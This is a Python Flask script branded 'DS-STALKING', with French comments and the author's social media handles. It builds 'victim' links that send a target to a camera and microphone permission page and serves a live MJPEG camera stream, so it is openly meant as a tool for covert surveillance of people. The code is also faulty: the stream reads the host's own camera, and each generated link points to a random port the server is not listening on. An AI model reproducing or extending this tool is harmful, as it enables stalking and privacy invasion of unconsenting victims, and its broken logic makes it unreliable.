from flask import Flask, render_template, request, jsonify, Response
import cv2
import socket
import random
import pyfiglet
import webbrowser

# Initialiser l'application Flask
app = Flask(__name__)

# Afficher l'interface ASCII art
def display_interface():
    custom_fig = pyfiglet.Figlet(font="small")
    ascii_art_text = custom_fig.renderText("DS-STALKING")
    info = [
        "BY: 2806",
        "Telegram: t.me/Mr_2806",
        "Tiktok: dedsec_x.0",
        "Youtube: Dedsec assistant"
    ]
    border = "=" * 40
    print(border)
    print(ascii_art_text)
    for line in info:
        print(f"  {line}")
    print(border)

# Obtenir l'adresse IP locale
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

# Générer un port aléatoire
def get_random_port():
    return random.randint(10000, 65535)

# Capture du flux vidéo
def generate_video_stream():
    # Initialiser OpenCV pour capturer depuis la caméra
    cap = cv2.VideoCapture(0)  # '0' pour la caméra par défaut
    while True:
        ret, frame = cap.read()
        if not ret:
            break

        # Encoder l'image en JPEG
        _, jpeg = cv2.imencode('.jpg', frame)
        # Convertir l'image en bytes
        frame_bytes = jpeg.tobytes()

        # Transmission de l'image en temps réel
        yield (b'--frame\r\n'
               b'Content-Type: image/jpeg\r\n\r\n' + frame_bytes + b'\r\n\r\n')

    cap.release()

@app.route('/video_feed')
def video_feed():
    # Flux vidéo en direct via Flask
    return Response(generate_video_stream(), mimetype='multipart/x-mixed-replace; boundary=frame')

@app.route("/")
def home():
    # Page principale qui demande le lien à entrer
    return render_template("index.html")

@app.route("/victim_link", methods=["POST"])
def victim_link():
    # Retourner un lien unique pour la victime
    user_link = request.json.get("user_link")
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque fois
    victim_url = f"http://{local_ip}:{port}/victim_permission"
    return jsonify({"victim_url": victim_url})

@app.route("/victim_permission")
def victim_permission():
    # Demander l'autorisation de la caméra et du micro
    return render_template("victim_permission.html")

@app.route("/stream_link", methods=["POST"])
def stream_link():
    # Retourner le lien de flux vidéo et audio en temps réel
    local_ip = get_local_ip()
    port = get_random_port()  # Port aléatoire à chaque exécution
    stream_url = f"http://{local_ip}:{port}/video_feed"
    return jsonify({"stream_url": stream_url})

if __name__ == "__main__":
    # Lancer le serveur Flask
    local_ip = get_local_ip()
    port = get_random_port()
    print(f"Serveur en cours d'exécution : http://{local_ip}:{port}")

    display_interface()

    # Ouvrir le navigateur pour l'utilisateur afin de suivre les flux vidéo
    webbrowser.open(f"http://{local_ip}:{port}")

    app.run(host="0.0.0.0", port=port)